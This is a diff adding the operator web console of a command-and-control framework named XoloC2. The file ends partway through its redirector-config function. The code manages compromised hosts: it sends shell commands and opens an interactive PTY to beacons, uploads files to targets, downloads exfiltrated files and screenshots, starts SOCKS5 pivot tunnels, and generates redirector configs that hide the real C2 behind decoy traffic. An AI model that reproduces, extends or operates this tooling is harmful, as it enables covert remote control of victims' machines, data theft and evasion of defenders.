@@ -1,0 +1,2081 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XoloC2</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/png" href="/static/xolo.png">
+  <link rel="stylesheet" href="/static/css/style.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
+  <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
+</head>
+<body>
+<div class="layout">
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-logo">
+        <img src="/static/xolo.png" alt="XoloC2" style="width:128px;height:128px;border-radius:12px;object-fit:cover;">
+      </div>
+    </div>
+    <nav class="sidebar-nav">
+      <button class="nav-item active" onclick="showView('agents')" id="nav-agents">
+        <span class="icon">⚡</span> Sessions
+      </button>
+      <button class="nav-item" onclick="showView('generate')" id="nav-generate">
+        <span class="icon">⚙</span> Generate Beacon
+      </button>
+      <button class="nav-item" onclick="showView('redirector')" id="nav-redirector">
+        <span class="icon">↪</span> Redirector
+      </button>
+    </nav>
+    <div class="sidebar-footer">
+      <button class="nav-item" onclick="showView('settings')" id="nav-settings">
+        <span class="icon">⚙</span> Settings
+      </button>
+      <button class="nav-item" onclick="logout()">
+        <span class="icon">⏻</span> Logout
+        <span id="sidebar-user" style="color:var(--text3);font-size:10px;margin-left:auto"></span>
+      </button>
+    </div>
+  </aside>
+
+  <!-- Main -->
+  <main class="main">
+    <div class="topbar">
+      <span class="topbar-title" id="topbar-title">Sessions</span>
+      <div style="display:flex;align-items:center;gap:16px">
+        <span id="ws-indicator" title="WebSocket" style="font-size:10px;color:var(--text3)">● WS</span>
+        <span id="topbar-status" style="color:var(--text3);font-size:11px"></span>
+        <span id="session-timer" style="font-size:11px;color:var(--text3);font-family:var(--font-mono)" title="Session expires in"></span>
+      </div>
+    </div>
+
+    <div class="content" id="content">
+      <!-- Dynamic content rendered here -->
+    </div>
+  </main>
+</div>
+
+<!-- Toast container -->
+<div id="toast-container" style="position:fixed;bottom:24px;right:24px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none"></div>
+
+<!-- Upload File Modal -->
+<div class="modal-overlay" id="upload-modal">
+  <div class="modal">
+    <h2>↑ Upload File to Agent</h2>
+    <p style="color:var(--text3);font-size:11px;margin-bottom:16px;line-height:1.5">
+      The file will be staged on the server. The beacon will download and write it to the destination path on its next check-in.
+    </p>
+    <div class="error-msg" id="upload-error"></div>
+    <div class="form-group">
+      <label>File</label>
+      <input type="file" id="upload-file" style="color:var(--text);background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px;width:100%">
+    </div>
+    <div class="form-group">
+      <label>Destination path on target</label>
+      <input type="text" id="upload-dest" placeholder="/tmp/file.txt">
+    </div>
+    <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:8px">
+      <button class="btn btn-ghost" onclick="closeUploadModal()">Cancel</button>
+      <button class="btn" onclick="submitUpload()">↑ Upload</button>
+    </div>
+  </div>
+</div>
+
+<!-- PTY Shell Modal -->
+<div class="modal-overlay" id="pty-modal">
+  <div class="modal" style="max-width:900px;width:95vw;max-height:92vh;padding:16px">
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+      <h2 style="margin:0;font-size:14px">🖥 Interactive Shell</h2>
+      <div style="display:flex;gap:10px;align-items:center">
+        <span id="pty-status" style="font-size:11px;color:var(--text3)">Connecting...</span>
+        <button class="btn btn-sm btn-ghost" onclick="closePtyShell()">✕ Close</button>
+      </div>
+    </div>
+    <div id="pty-terminal" style="height:500px;background:#0d0d0d;border-radius:6px;overflow:hidden;padding:4px"></div>
+  </div>
+</div>
+
+<!-- Change Password Modal -->
+<div class="modal-overlay" id="pw-modal">
+  <div class="modal">
+    <h2>Change Password</h2>
+    <div class="error-msg" id="pw-modal-error"></div>
+    <div class="form-group">
+      <label>Current Password</label>
+      <input type="password" id="pm-current">
+    </div>
+    <div class="form-group">
+      <label>New Password (min 12 chars)</label>
+      <input type="password" id="pm-new">
+    </div>
+    <div class="form-group">
+      <label>Confirm New Password</label>
+      <input type="password" id="pm-confirm">
+    </div>
+    <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:8px">
+      <button class="btn btn-ghost" onclick="closePwModal()">Cancel</button>
+      <button class="btn" onclick="submitChangePw()">Change</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── Auth helpers ────────────────────────────────────────
+const TOKEN_KEY = 'xolo_token';
+
+function getToken() { return localStorage.getItem(TOKEN_KEY); }
+
+function authHeaders() {
+  return { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getToken() };
+}
+
+async function apiFetch(path, opts = {}) {
+  const res = await fetch(path, { ...opts, headers: authHeaders() });
+  if (res.status === 401) { logout(); return null; }
+  return res;
+}
+
+function logout() {
+  localStorage.removeItem(TOKEN_KEY);
+  localStorage.removeItem('xolo_exp');
+  window.location.href = '/login';
+}
+
+// ── Session timer ────────────────────────────────────────
+function updateSessionTimer() {
+  const exp = parseInt(localStorage.getItem('xolo_exp') || '0', 10) * 1000;
+  if (!exp) return;
+  const rem = exp - Date.now();
+  if (rem <= 0) { logout(); return; }
+  const h = Math.floor(rem / 3600000);
+  const m = Math.floor((rem % 3600000) / 60000);
+  const s = Math.floor((rem % 60000) / 1000);
+  const el = document.getElementById('session-timer');
+  if (!el) return;
+  el.textContent = h > 0 ? `⏱ ${h}h ${m}m` : `⏱ ${m}m ${String(s).padStart(2,'0')}s`;
+  el.style.color = rem < 300000 ? 'var(--danger)' : 'var(--text3)';
+}
+setInterval(updateSessionTimer, 1000);
+updateSessionTimer();
+
+// ── State ───────────────────────────────────────────────
+let currentView = 'agents';
+let currentAgentId = null;
+let pollTimer = null;
+let agentPollTimer = null;
+let taskHistory = [];  // [{command, output, status, id}]
+
+// ── Toast notifications ───────────────────────────────────
+function showToast(msg, type = 'info') {
+  const container = document.getElementById('toast-container');
+  if (!container) return;
+  const el = document.createElement('div');
+  el.style.cssText = `background:var(--bg2);border:1px solid ${
+    type === 'success' ? 'var(--online)' :
+    type === 'warning' ? 'var(--warning)' :
+    type === 'danger'  ? 'var(--danger)'  : 'var(--border)'
+  };border-radius:8px;padding:10px 14px;font-size:12px;color:var(--text);pointer-events:auto;box-shadow:0 4px 20px rgba(0,0,0,0.4);min-width:220px;max-width:320px;line-height:1.5`;
+  el.textContent = msg;
+  container.appendChild(el);
+  setTimeout(() => el.style.opacity = '0', 3500);
+  setTimeout(() => el.remove(), 4000);
+}
+
+// ── WebSocket ────────────────────────────────────────────
+let _ws = null;
+let _wsRetry = 1000;
+
+function connectWS() {
+  const token = getToken();
+  if (!token) return;
+  const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+  _ws = new WebSocket(`${proto}//${window.location.host}/ws?token=${encodeURIComponent(token)}`);
+
+  _ws.onopen = () => {
+    _wsRetry = 1000;
+    const ind = document.getElementById('ws-indicator');
+    if (ind) { ind.style.color = 'var(--online)'; ind.title = 'WebSocket conectado'; }
+  };
+
+  _ws.onmessage = (event) => {
+    try {
+      const msg = JSON.parse(event.data);
+      if (msg.type === 'agent_checkin') {
+        if (currentView === 'agents') refreshAgentList();
+        if (msg.is_new) showToast(`⚡ Nuevo agente: ${msg.hostname}`, 'success');
+      } else if (msg.type === 'task_result') {
+        if (currentView === 'session' && currentAgentId === msg.agent_id) {
+          refreshTaskResults(msg.agent_id);
+        }
+      } else if (msg.type === 'pty_output') {
+        if (_ptyTerm && msg.session_id === _ptySessId && msg.data) {
+          try {
+            _ptyTerm.write(Uint8Array.from(atob(msg.data), c => c.charCodeAt(0)));
+          } catch (_) {}
+        }
+      }
+    } catch (_) {}
+  };
+
+  _ws.onclose = () => {
+    const ind = document.getElementById('ws-indicator');
+    if (ind) { ind.style.color = 'var(--text3)'; ind.title = 'WebSocket reconectando...'; }
+    setTimeout(connectWS, Math.min(_wsRetry, 30000));
+    _wsRetry = Math.min(_wsRetry * 2, 30000);
+  };
+
+  // Keep-alive ping every 20s
+  setInterval(() => { if (_ws && _ws.readyState === 1) _ws.send('ping'); }, 20000);
+}
+
+// ── Init ────────────────────────────────────────────────
+(async function init() {
+  if (!getToken()) { window.location.href = '/login'; return; }
+
+  const res = await apiFetch('/api/auth/me');
+  if (!res) return;
+  if (!res.ok) { logout(); return; }
+  const me = await res.json();
+
+  document.getElementById('sidebar-user').textContent = me.username;
+
+  if (me.must_change_password) {
+    document.getElementById('pw-modal').classList.add('open');
+  }
+
+  connectWS();
+  showView('agents');
+})();
+
+// ── Views ────────────────────────────────────────────────
+function showView(view, agentId) {
+  clearPolling();
+  currentView = view;
+  currentAgentId = agentId || null;
+
+  // Nav highlight
+  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+  const navEl = document.getElementById('nav-' + (view === 'session' ? 'agents' : view));
+  if (navEl) navEl.classList.add('active');
+
+  if (view === 'agents') {
+    document.getElementById('topbar-title').textContent = 'Sessions';
+    renderAgentsView();
+    pollTimer = setInterval(refreshAgentList, 30000); // WS handles real-time; this is fallback
+  } else if (view === 'session') {
+    document.getElementById('topbar-title').textContent = 'Session: ' + agentId.slice(0, 8) + '...';
+    renderSessionView(agentId);
+  } else if (view === 'generate') {
+    document.getElementById('topbar-title').textContent = 'Generate Beacon';
+    renderGenerateView();
+  } else if (view === 'redirector') {
+    document.getElementById('topbar-title').textContent = 'Redirector Config';
+    renderRedirectorView();
+  } else if (view === 'settings') {
+    document.getElementById('topbar-title').textContent = 'Settings';
+    renderSettingsView();
+  }
+}
+
+function clearPolling() {
+  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  if (agentPollTimer) { clearInterval(agentPollTimer); agentPollTimer = null; }
+}
+
+// ── Agents List View ─────────────────────────────────────
+async function renderAgentsView() {
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div class="stats-row" id="stats-row">
+      <div class="stat-card"><div class="label">Total Sessions</div><div class="value" id="stat-total">—</div></div>
+      <div class="stat-card"><div class="label">Online</div><div class="value online" id="stat-online">—</div></div>
+      <div class="stat-card"><div class="label">Offline</div><div class="value" id="stat-offline" style="color:var(--text3)">—</div></div>
+    </div>
+    <div class="table-wrap">
+      <div class="table-header">
+        <h2>Active Sessions</h2>
+        <button class="btn btn-sm btn-ghost" onclick="refreshAgentList()">↻ Refresh</button>
+      </div>
+      <div id="agent-table-body"></div>
+    </div>`;
+  await refreshAgentList();
+}
+
+async function refreshAgentList() {
+  const res = await apiFetch('/api/agents');
+  if (!res || !res.ok) return;
+  const agents = await res.json();
+
+  document.getElementById('stat-total').textContent = agents.length;
+  const online = agents.filter(a => a.online).length;
+  document.getElementById('stat-online').textContent = online;
+  document.getElementById('stat-offline').textContent = agents.length - online;
+
+  const body = document.getElementById('agent-table-body');
+  if (!body) return;
+
+  if (agents.length === 0) {
+    body.innerHTML = `<div class="empty-state"><div class="icon">📡</div><p>No sessions yet. Deploy a beacon to see it here.</p></div>`;
+    return;
+  }
+
+  body.innerHTML = `
+    <table>
+      <thead>
+        <tr>
+          <th>Status</th>
+          <th>ID</th>
+          <th>Hostname</th>
+          <th>User</th>
+          <th>IP (Internal)</th>
+          <th>OS</th>
+          <th>Last Seen</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        ${agents.map(a => `
+          <tr class="clickable" onclick="showView('session', '${escapeHtml(a.id)}')">
+            <td>
+              <span class="badge ${a.online ? 'badge-online' : 'badge-offline'}">
+                <span class="dot ${a.online ? 'dot-online' : 'dot-offline'}"></span>
+                ${a.online ? 'ONLINE' : 'OFFLINE'}
+              </span>
+            </td>
+            <td style="color:var(--text3);font-size:11px">${escapeHtml(a.id.slice(0, 8))}</td>
+            <td>${escapeHtml(a.hostname || '—')}</td>
+            <td style="color:var(--accent2)">${escapeHtml(a.username || '—')}</td>
+            <td>${escapeHtml(a.ip_internal || '—')}</td>
+            <td style="color:var(--text2);font-size:11px">${escapeHtml((a.os_info || '').slice(0, 30))}</td>
+            <td style="color:var(--text3);font-size:11px">${a.seconds_ago !== null ? formatAgo(a.seconds_ago) : '—'}</td>
+            <td>
+              <button class="btn btn-sm btn-ghost" onclick="event.stopPropagation();deleteAgent('${escapeHtml(a.id)}')">✕</button>
+            </td>
+          </tr>`).join('')}
+      </tbody>
+    </table>`;
+}
+
+async function deleteAgent(id) {
+  if (!confirm('Delete this session? All tasks will be removed.')) return;
+  await apiFetch('/api/agents/' + id, { method: 'DELETE' });
+  refreshAgentList();
+}
+
+// ── Session Detail View ──────────────────────────────────
+async function renderSessionView(agentId) {
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div style="margin-bottom:12px">
+      <button class="btn btn-ghost btn-sm" onclick="showView('agents')">← Back</button>
+    </div>
+    <div class="session-layout" style="height:calc(100vh - 140px)">
+      <div class="session-info">
+        <div class="info-card" id="agent-info-card">
+          <h3>Session Info</h3>
+          <div style="color:var(--text3);font-size:11px">Loading...</div>
+        </div>
+        <div class="info-card">
+          <h3>Note</h3>
+          <textarea id="agent-note" style="width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:11px;padding:8px;resize:none;height:80px;outline:none" placeholder="Add a note..."></textarea>
+          <button class="btn btn-sm" style="margin-top:6px;width:100%" onclick="saveNote('${escapeHtml(agentId)}')">Save Note</button>
+        </div>
+        <div class="info-card">
+          <h3>SOCKS5 Tunnel</h3>
+          <div id="socks-status-wrap">
+            <div id="socks-status-text" style="font-size:11px;color:var(--text3);margin-bottom:8px">Loading...</div>
+            <div id="socks-channels" style="font-size:10px;color:var(--text3);margin-bottom:8px"></div>
+          </div>
+          <div style="display:flex;gap:6px;align-items:end;margin-bottom:8px">
+            <div class="form-group" style="margin:0;flex:1">
+              <label style="font-size:10px">Port</label>
+              <input type="number" id="socks-port" value="1080" min="1024" max="65535"
+                style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:5px 8px;outline:none;width:100%">
+            </div>
+          </div>
+          <div style="display:flex;gap:6px">
+            <button class="btn btn-sm" onclick="startSocks5('${escapeHtml(agentId)}')">▶ Start</button>
+            <button class="btn btn-sm btn-ghost" onclick="stopSocks5()">■ Stop</button>
+            <button class="btn btn-sm btn-ghost" onclick="refreshSocks5Status()">↻</button>
+          </div>
+        </div>
+        <div class="info-card">
+          <h3>Export</h3>
+          <button class="btn btn-sm btn-ghost" style="width:100%;margin-bottom:6px" onclick="exportTasks('${escapeHtml(agentId)}','txt')">⬇ Export .txt</button>
+          <button class="btn btn-sm btn-ghost" style="width:100%" onclick="exportTasks('${escapeHtml(agentId)}','json')">⬇ Export .json</button>
+        </div>
+      </div>
+      <div class="session-terminal">
+        <div class="terminal-wrap">
+          <div class="terminal-header">
+            <div class="dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+            <span class="terminal-title">beacon shell — ${escapeHtml(agentId.slice(0, 8))}</span>
+            <div style="display:flex;gap:6px">
+              <button class="btn btn-sm btn-ghost" id="pty-btn" onclick="openPtyShell('${escapeHtml(agentId)}')">🖥 PTY Shell</button>
+              <button class="btn btn-sm btn-ghost" onclick="openUploadModal('${escapeHtml(agentId)}')">↑ Upload</button>
+              <button class="btn btn-sm btn-ghost" onclick="clearTerminal()">Clear</button>
+            </div>
+          </div>
+          <div class="terminal-output" id="term-output">
+            <div style="color:var(--text3);font-size:11px">
+              Connected. Type a command and press Enter.<br>
+              Built-in: <span style="color:var(--accent)">shell &lt;cmd&gt;</span> | <span style="color:var(--accent)">download &lt;path&gt;</span> | <span style="color:var(--accent)">screenshot</span> | <span style="color:var(--accent)">ps</span> | <span style="color:var(--accent)">kill &lt;pid&gt;</span> | <span style="color:var(--accent)">info</span> | <span style="color:var(--accent)">sleep &lt;s&gt;</span>
+            </div>
+          </div>
+          <div class="terminal-input">
+            <span id="term-cwd" style="color:var(--accent2);font-size:10pt;margin-right:6px;opacity:0.8">~</span>
+            <span class="prompt-sym">❯</span>
+            <input type="text" id="term-input" placeholder="Enter command..."
+                   onkeydown="handleTermKey(event, '${escapeHtml(agentId)}')">
+          </div>
+        </div>
+      </div>
+    </div>`;
+
+  taskHistory = [];
+  loadCmdHistory(agentId);   // restore ↑↓ history from localStorage
+  await loadAgentInfo(agentId);
+  await loadTaskHistory(agentId);
+
+  // Fallback poll — WS triggers updates in real-time, this handles reconnect gaps
+  agentPollTimer = setInterval(() => refreshTaskResults(agentId), 15000);
+
+  // Load SOCKS5 status
+  refreshSocks5Status();
+
+  document.getElementById('term-input').focus();
+}
+
+async function loadAgentInfo(agentId) {
+  const res = await apiFetch('/api/agents/' + agentId);
+  if (!res || !res.ok) return;
+  const a = await res.json();
+
+  // Update cwd in terminal prompt
+  const cwdEl = document.getElementById('term-cwd');
+  if (cwdEl && a.cwd) cwdEl.textContent = a.cwd;
+
+  const card = document.getElementById('agent-info-card');
+  if (!card) return;
+
+  card.innerHTML = `
+    <h3>Session Info</h3>
+    <div class="info-row"><span class="key">Status</span>
+      <span class="badge ${a.online ? 'badge-online' : 'badge-offline'}">${a.online ? 'ONLINE' : 'OFFLINE'}</span>
+    </div>
+    <div class="info-row"><span class="key">ID</span><span class="val" style="color:var(--text3)">${escapeHtml(a.id.slice(0, 12))}...</span></div>
+    <div class="info-row"><span class="key">Hostname</span><span class="val">${escapeHtml(a.hostname || '—')}</span></div>
+    <div class="info-row"><span class="key">User</span><span class="val" style="color:var(--accent2)">${escapeHtml(a.username || '—')}</span></div>
+    <div class="info-row"><span class="key">IP Internal</span><span class="val">${escapeHtml(a.ip_internal || '—')}</span></div>
+    <div class="info-row"><span class="key">OS</span><span class="val">${escapeHtml(a.os_info || '—')}</span></div>
+    <div class="info-row"><span class="key">PID</span><span class="val">${a.pid || '—'}</span></div>
+    <div class="info-row"><span class="key">Sleep</span><span class="val">${a.sleep_interval}s</span></div>
+    <div class="info-row"><span class="key">Last seen</span><span class="val">${a.seconds_ago !== null ? formatAgo(a.seconds_ago) : '—'}</span></div>`;
+
+  const noteEl = document.getElementById('agent-note');
+  if (noteEl) noteEl.value = a.note || '';
+
+  const ptyBtn = document.getElementById('pty-btn');
+  if (ptyBtn) {
+    const isWin = (a.os_info || '').toLowerCase().includes('windows');
+    ptyBtn.disabled = isWin;
+    ptyBtn.title = isWin ? 'PTY no disponible en Windows' : 'Abrir shell interactiva';
+    ptyBtn.style.opacity = isWin ? '0.4' : '';
+    ptyBtn.style.cursor = isWin ? 'not-allowed' : '';
+  }
+}
+
+
+async function exportTasks(agentId, format) {
+  const res = await apiFetch('/api/agents/' + agentId + '/tasks');
+  if (!res || !res.ok) return;
+  const tasks = await res.json();
+
+  let content, filename, mime;
+  if (format === 'json') {
+    content = JSON.stringify(tasks, null, 2);
+    filename = `tasks_${agentId.slice(0,8)}.json`;
+    mime = 'application/json';
+  } else {
+    content = tasks.map(t => [
+      `[${t.created_at || ''}] CMD: ${t.command}`,
+      `STATUS: ${t.status}`,
+      t.output && !t.output.startsWith('__b64file__') ? `OUTPUT:\n${t.output}` : '(binary file)',
+      '─'.repeat(60),
+    ].join('\n')).join('\n\n');
+    filename = `tasks_${agentId.slice(0,8)}.txt`;
+    mime = 'text/plain';
+  }
+
+  const blob = new Blob([content], { type: mime });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = filename;
+  a.click();
+}
+
+async function loadTaskHistory(agentId) {
+  const res = await apiFetch('/api/agents/' + agentId + '/tasks');
+  if (!res || !res.ok) return;
+  const tasks = await res.json();
+
+  // Show last 20 tasks, oldest first
+  taskHistory = tasks.slice(0, 20).reverse();
+  renderTerminal();
+}
+
+async function refreshTaskResults(agentId) {
+  if (currentView !== 'session' || currentAgentId !== agentId) return;
+
+  const pending = taskHistory.filter(t => t.status === 'pending' || t.status === 'running');
+  if (pending.length === 0) {
+    // Still refresh agent info
+    await loadAgentInfo(agentId);
+    return;
+  }
+
+  for (const t of pending) {
+    const res = await apiFetch(`/api/agents/${agentId}/tasks/${t.id}`);
+    if (!res || !res.ok) continue;
+    const updated = await res.json();
+    const idx = taskHistory.findIndex(x => x.id === t.id);
+    if (idx >= 0) taskHistory[idx] = updated;
+  }
+
+  renderTerminal();
+  await loadAgentInfo(agentId);
+}
+
+function renderTerminal() {
+  const out = document.getElementById('term-output');
+  if (!out) return;
+
+  const intro = `<div style="color:var(--text3);font-size:11px;margin-bottom:10px">
+    Connected. Type a command and press Enter.<br>
+    Built-in: <span style="color:var(--accent)">shell &lt;cmd&gt;</span> | <span style="color:var(--accent)">info</span> | <span style="color:var(--accent)">sleep &lt;seconds&gt;</span>
+  </div>`;
+
+  const entries = taskHistory.map(t => {
+    // Friendly label for internal commands
+    let displayCmd = t.command;
+    if (t.command.startsWith('__upload__:')) {
+      const parts = t.command.split(':');
+      displayCmd = `upload ${parts[1]} → ${parts[2]}`;
+    }
+
+    let outputHtml;
+    if (t.status === 'pending') {
+      outputHtml = `<span class="cmd-output pending">[ waiting for beacon... ]</span>`;
+    } else if (t.status === 'running') {
+      outputHtml = `<span class="cmd-output running">[ executing... ]</span>`;
+    } else if (t.output && t.output.startsWith('__b64file__:')) {
+      const parts = t.output.split(':');
+      const fname = parts[1];
+      const b64data = parts.slice(2).join(':');
+      const agentId = currentAgentId;
+      const isImage = /\.(png|jpg|jpeg|gif|bmp|webp)$/i.test(fname);
+      const thumbHtml = isImage
+        ? `<img src="data:image/png;base64,${b64data}"
+               style="max-width:280px;max-height:160px;border-radius:6px;border:1px solid var(--border);
+                      cursor:pointer;margin-top:6px;display:block"
+               onclick="this.style.maxWidth=this.style.maxWidth==='100%'?'280px':'100%'"
+               title="Click para ampliar">`
+        : '';
+      outputHtml = `
+        <div style="padding:6px 0">
+          <div style="display:flex;align-items:center;gap:10px">
+            <span style="color:var(--accent2)">📥 ${escapeHtml(fname)}</span>
+            <button class="btn btn-sm" onclick="downloadExfil('${escapeHtml(agentId)}','${escapeHtml(t.id)}','${escapeHtml(fname)}')">↓ Download</button>
+          </div>
+          ${thumbHtml}
+        </div>`;
+    } else if (t.status === 'error') {
+      outputHtml = `<div class="cmd-output error">${escapeHtml(t.output || '(error)')}</div>`;
+    } else {
+      outputHtml = `<div class="cmd-output">${escapeHtml(t.output || '(no output)')}</div>`;
+    }
+
+    return `<div class="cmd-entry">
+      <div class="cmd-prompt">❯ <span class="host">${escapeHtml(displayCmd)}</span></div>
+      ${outputHtml}
+    </div>`;
+  }).join('');
+
+  out.innerHTML = intro + entries;
+  out.scrollTop = out.scrollHeight;
+}
+
+function clearTerminal() {
+  taskHistory = [];
+  renderTerminal();
+}
+
+const CMD_HISTORY_MAX = 500;
+let cmdHistory = [];
+let cmdHistoryIdx = -1;
+
+function historyKey(agentId) {
+  return `xolo_history_${agentId}`;
+}
+
+function loadCmdHistory(agentId) {
+  try {
+    const raw = localStorage.getItem(historyKey(agentId));
+    cmdHistory = raw ? JSON.parse(raw) : [];
+  } catch {
+    cmdHistory = [];
+  }
+  cmdHistoryIdx = -1;
+}
+
+function saveCmdHistory(agentId) {
+  try {
+    // Keep last CMD_HISTORY_MAX entries
+    const trimmed = cmdHistory.slice(-CMD_HISTORY_MAX);
+    localStorage.setItem(historyKey(agentId), JSON.stringify(trimmed));
+  } catch {}
+}
+
+async function handleTermKey(event, agentId) {
+  const input = document.getElementById('term-input');
+
+  if (event.key === 'ArrowUp') {
+    event.preventDefault();
+    if (cmdHistoryIdx < cmdHistory.length - 1) {
+      cmdHistoryIdx++;
+      input.value = cmdHistory[cmdHistory.length - 1 - cmdHistoryIdx] || '';
+    }
+    return;
+  }
+  if (event.key === 'ArrowDown') {
+    event.preventDefault();
+    if (cmdHistoryIdx > 0) {
+      cmdHistoryIdx--;
+      input.value = cmdHistory[cmdHistory.length - 1 - cmdHistoryIdx] || '';
+    } else {
+      cmdHistoryIdx = -1;
+      input.value = '';
+    }
+    return;
+  }
+
+  if (event.key !== 'Enter') return;
+
+  const cmd = input.value.trim();
+  if (!cmd) return;
+
+  input.value = '';
+  cmdHistoryIdx = -1;
+
+  // Client-side commands (not sent to beacon)
+  if (cmd === '/help') {
+    const helpHtml = `<div class="cmd-entry">
+      <div class="cmd-prompt">❯ <span class="host">/help</span></div>
+      <div class="cmd-output" style="line-height:2">
+        <span style="color:var(--accent);font-weight:600">Built-in beacon commands</span><br>
+        <span style="color:var(--accent2)">info</span>                — agente info (ID, OS, IP, user, PID, CWD)<br>
+        <span style="color:var(--accent2)">screenshot</span>          — captura pantalla y descarga<br>
+        <span style="color:var(--accent2)">ps</span>                  — lista procesos activos<br>
+        <span style="color:var(--accent2)">kill &lt;pid&gt;</span>          — termina un proceso por PID<br>
+        <span style="color:var(--accent2)">download &lt;/ruta&gt;</span>    — exfiltra archivo al operador<br>
+        <span style="color:var(--accent2)">sleep &lt;segundos&gt;</span>    — cambia intervalo de checkin<br>
+        <span style="color:var(--accent2)">shell &lt;cmd&gt;</span>         — ejecuta comando de shell explícitamente<br>
+        <span style="color:var(--text3)">cualquier otro texto</span>  — ejecutado como shell command directo<br>
+        <br>
+        <span style="color:var(--accent);font-weight:600">Operador (upload)</span><br>
+        <span style="color:var(--accent2)">↑ Upload</span>            — sube archivo desde tu PC al agente<br>
+        <br>
+        <span style="color:var(--accent);font-weight:600">Navegación</span><br>
+        <span style="color:var(--accent2)">↑ ↓</span>                 — historial de comandos<br>
+        <span style="color:var(--accent2)">/help</span>               — muestra este menú<br>
+        <span style="color:var(--accent2)">/clear</span>              — limpia la terminal<br>
+      </div>
+    </div>`;
+    const out = document.getElementById('term-output');
+    if (out) { out.innerHTML += helpHtml; out.scrollTop = out.scrollHeight; }
+    return;
+  }
+
+  if (cmd === '/clear') {
+    clearTerminal();
+    return;
+  }
+
+  // Avoid consecutive duplicate entries (like bash HISTCONTROL=ignoredups)
+  if (cmdHistory[cmdHistory.length - 1] !== cmd) {
+    cmdHistory.push(cmd);
+    saveCmdHistory(agentId);
+  }
+
+  const res = await apiFetch('/api/agents/' + agentId + '/tasks', {
+    method: 'POST',
+    body: JSON.stringify({ command: cmd }),
+  });
+
+  if (!res || !res.ok) return;
+  const task = await res.json();
+
+  // API returns task_id, normalize to id so refreshTaskResults can find it
+  taskHistory.push({ id: task.task_id, command: cmd, status: task.status, output: '' });
+  renderTerminal();
+}
+
+async function saveNote(agentId) {
+  const note = document.getElementById('agent-note').value;
+  await apiFetch('/api/agents/' + agentId + '/note', {
+    method: 'PATCH',
+    body: JSON.stringify({ note }),
+  });
+}
+
+// ── Redirector Config View ────────────────────────────────
+function renderRedirectorView() {
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div style="max-width:640px;margin:0 auto;display:flex;flex-direction:column;gap:16px;padding-bottom:40px">
+
+      <div class="info-card" style="margin:0">
+        <h3>Parámetros</h3>
+        <p style="font-size:11px;color:var(--text3);margin-bottom:16px;line-height:1.6">
+          Genera configuración para un servidor redirector (VPS limpio) que reenvía tráfico C2 al servidor real y sirve contenido legítimo al resto.
+        </p>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
+          <div class="form-group" style="margin:0">
+            <label>C2 real (IP:puerto)</label>
+            <input type="text" id="rd-c2" placeholder="10.10.10.10:8443" value="${window.location.host}">
+          </div>
+          <div class="form-group" style="margin:0">
+            <label>Dominio del redirector</label>
+            <input type="text" id="rd-domain" placeholder="cdn-update.example.com">
+          </div>
+          <div class="form-group" style="margin:0">
+            <label>URL señuelo (resto del tráfico)</label>
+            <input type="text" id="rd-decoy" placeholder="https://www.microsoft.com/" value="https://www.microsoft.com/">
+          </div>
+          <div class="form-group" style="margin:0">
+            <label>Path del beacon (regex)</label>
+            <input type="text" id="rd-path" placeholder="/api/beacon" value="/api/beacon">
+          </div>
+        </div>
+        <div style="display:flex;gap:8px;margin-bottom:16px">
+          <button class="btn btn-sm" onclick="generateRedirectorConfig('apache')">Apache</button>
+          <button class="btn btn-sm btn-ghost" onclick="generateRedirectorConfig('nginx')">nginx</button>
+          <button class="btn btn-sm btn-ghost" onclick="generateRedirectorConfig('caddy')">Caddy</button>
+        </div>
+      </div>
+
+      <div id="rd-output" style="display:none">
+        <div class="info-card" style="margin:0">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
+            <h3 id="rd-output-title" style="margin:0">Config</h3>
+            <button class="btn btn-sm btn-ghost" id="rd-copy-btn" onclick="copyRedirector()">⎘ Copy</button>
+          </div>
+          <pre id="rd-code" style="background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:14px;font-size:11px;color:var(--accent2);white-space:pre;overflow-x:auto;line-height:1.6"></pre>
+          <div style="margin-top:12px;padding:10px 14px;background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.2);border-radius:6px;font-size:11px;color:var(--warning);line-height:1.7">
+            <strong>Notas de despliegue:</strong><br>
+            • Instalar en un VPS limpio con IP/dominio diferente al C2 real<br>
+            • El C2 real debe escuchar en la IP configurada arriba<br>
+            • Habilitar <code>mod_proxy</code> / <code>mod_proxy_http</code> en Apache<br>
+            • Usar certificado TLS válido en el redirector (Let's Encrypt / Certbot)<br>
+            • El beacon apunta al redirector, no al C2 real
+          </div>
+        </div>
+      </div>
+
+    </div>`;
+}
+
+function generateRedirectorConfig(type) {
+  const c2    = document.getElementById('rd-c2').value.trim() || 'C2_IP:8443';
+  const domain = document.getElementById('rd-domain').value.trim() || 'redirector.example.com';
